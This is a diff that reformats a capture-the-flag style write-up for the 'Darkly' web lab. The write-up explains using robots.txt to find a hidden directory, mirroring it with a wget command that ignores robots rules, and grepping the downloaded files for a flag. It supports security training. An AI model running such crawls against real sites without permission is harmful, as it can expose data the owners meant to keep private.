@@ -10,20 +10,20 @@ The `robots.txt` file on the `Darkly` server contains a directive to disallow ac
 
 ### Exploitation Steps
 
-1. **Locate the Vulnerable Directory**:
-   - Access the `robots.txt` file to identify restricted paths.
-   - Navigate to the `/.hidden` directory.
+1. Locate the Vulnerable Directory**:
+- Access the `robots.txt` file to identify restricted paths.
+- Navigate to the `/.hidden` directory.
 
-2. **Download Files Recursively**:
-   - Use `wget` to download all files and subdirectories from `/.hidden`:
-     ```bash
-     wget -r -np -e robots=off -R "index.html*" http://darkly/.hidden/
-     ```
+2. Download Files Recursively**:
+- Use `wget` to download all files and subdirectories from `/.hidden`:
+   ```bash
+   wget -r -np -e robots=off -R "index.html*" http://darkly/.hidden/
+   ```
 
-3. **Search for Sensitive Information**:
-   - Use a Bash script to parse downloaded files for a flag or other sensitive information:
-     ```bash
-     for file in $(find darkly/ -type f); do
-         cat $file | grep flag;
-     done
-     ```
+3. Search for Sensitive Information**:
+- Use a Bash script to parse downloaded files for a flag or other sensitive information:
+   ```bash
+   for file in $(find darkly/ -type f); do
+      cat $file | grep flag;
+   done
+   ```
